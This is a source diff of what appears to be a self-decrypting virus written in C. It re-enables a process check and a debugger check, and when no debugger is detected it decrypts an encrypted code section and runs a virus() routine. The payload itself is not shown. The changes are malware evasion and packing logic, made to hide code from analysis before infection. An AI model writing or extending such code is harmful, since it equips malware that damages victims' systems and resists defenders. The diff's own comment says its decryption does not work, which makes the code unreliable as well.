@@ -5,6 +5,8 @@
 #include "pos.h"
 #include "table.h"
 
+#define DEBUG(X) {char c = X;CALL(SYS_write, 2, &c, 1);}
+
 int __attribute__((section (".textearly"))) main(int ac, char **av) asm ("entry");
 
 extern struct s_opt opt;
@@ -47,18 +49,24 @@ void change_garbage_code(){
 
 extern void decrypt_block_asm(uint32_t *v, uint32_t *k);
 
-int decryptHiddenCode(){
+int __attribute__((section (".textearly"))) decryptHiddenCode(){
 	char *s = ((char*)&crypt_start);
 	uint64_t n = ((size_t)&crypt_end) - ((size_t)&crypt_start);
 
-	decrypt(s,n,(uint32_t*)key);
+	for (uint64_t i = 0; i < n; i += 8)
+		if (i + 8 < n)
+			decrypt_block((uint32_t*)(s + i), (uint32_t*)key);
+	//decrypt(s,n,(uint32_t*)key);
 	//decrypt test area
-	decrypt(&test_area,15,(uint32_t*)key);
+	//decrypt(&test_area,15,(uint32_t*)key);
+	// -> error, decrypt dont work
 	//check test area
-	for (int i = 0; i < n; i++)
+	for (int i = 0; i < 15; i += 8)
+		if (i + 8 < 15)
+			decrypt_block((uint32_t*)(char*)&test_area + i, (uint32_t*)key);
+	for (int i = 0; i < 15; i++)
 		if ((&test_area)[i] != 'A')
 			return FALSE;
-	
 	return TRUE;
 }
 
@@ -92,17 +100,11 @@ int main(int ac, char **av){
 	cmp[2] = 's';
 	cmp[3] = 't';
 	cmp[4] = '\0';
-	/*if (checkproc(cmp) == FALSE)
-	{
-		CALL(SYS_write, 1, cmp, 4);
+	if (checkproc(cmp) == FALSE)
 		return FALSE;
-	}*/
-	key[0] ^= 0b01110010 ;//<< traceme();
-	/*if (checkdebug() == 0)
-	{
+	if (checkdebug() == 0)
 		return decryptHiddenCode() && virus(ac, av);
-	}
 	else
-		CALL(SYS_write, 1, "DEBUGGING..\n", 12);*/
+		CALL(SYS_write, 1, "DEBUGGING..\n", 12);
 	return (0);
 }
